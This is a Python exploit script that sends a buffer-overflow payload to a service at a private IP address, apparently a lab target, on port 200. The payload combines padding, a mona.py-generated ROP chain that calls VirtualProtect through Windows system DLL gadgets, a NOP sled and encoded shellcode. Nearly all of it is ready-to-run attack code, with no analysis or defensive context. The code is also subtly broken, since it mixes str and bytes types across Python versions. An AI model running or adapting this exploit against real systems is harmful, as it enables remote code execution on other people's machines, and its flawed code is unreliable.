import struct, socket

shellcode = (b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
            b"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
            b"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
            b"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
            b"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
            b"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37"
            b"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"
            b"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"
            b"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"
            b"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
            b"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48"
            b"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"
            b"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48"
            b"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43"
            b"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57"
            b"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"
            b"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"
            b"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53"
            b"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
            b"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49"
            b"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46"
            b"\x4e\x36\x43\x46\x42\x50\x5a")

RHOST = "192.168.74.128"
RPORT = 200

SIZE = 504
INT = b"\xcc"
NOP = b"\x90"
finish = b"\r\n\n"

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x77ebb4f8,  # POP EAX # RETN [RPCRT4.dll] 
        0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
        0x77e87a08,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
        0x77edfd57,  # PUSH EAX # DEC EAX # POP ESI # RETN [RPCRT4.dll] 
        #[---INFO:gadgets_to_set_ebp:---]
        0x77c1f57e,  # POP EBP # RETN [msvcrt.dll] 
        0x662ec374,  # & push esp # ret  [hnetcfg.dll]
        #[---INFO:gadgets_to_set_ebx:---]
        0x77c4deb4,  # POP EAX # RETN [msvcrt.dll] 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x77d74960,  # NEG EAX # RETN [USER32.dll] 
        0x7c90eda6,  # POP EBX # RETN [ntdll.dll] 
        0xffffffff,  #  
        0x77c127e5,  # INC EBX # RETN [msvcrt.dll] 
        0x77d8345e,  # ADD EBX,EAX # XOR EAX,EAX # RETN [USER32.dll] 
        #[---INFO:gadgets_to_set_edx:---]
        0x77c4e372,  # POP EAX # RETN [msvcrt.dll] 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x77dd9bca,  # NEG EAX # RETN [ADVAPI32.dll] 
        0x77c58f9c,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
        #[---INFO:gadgets_to_set_ecx:---]
        0x77c2f613,  # POP ECX # RETN [msvcrt.dll] 
        0x77e46040,  # ABC'nin magical addressi
        #[---INFO:gadgets_to_set_edi:---]
        0x77e3c8d4,  # POP EDI # RETN [ADVAPI32.dll] 
        0x77d74962,  # RETN (ROP NOP) [USER32.dll]
        #[---INFO:gadgets_to_set_eax:---]
        0x77eb754a,  # POP EAX # RETN [RPCRT4.dll] 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x7c9278e4,  # PUSHAD # RETN [ntdll.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

ROP = create_rop_chain()

FINAL = b"A"*504 + ROP + NOP*30 + shellcode + finish

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

s.send(FINAL)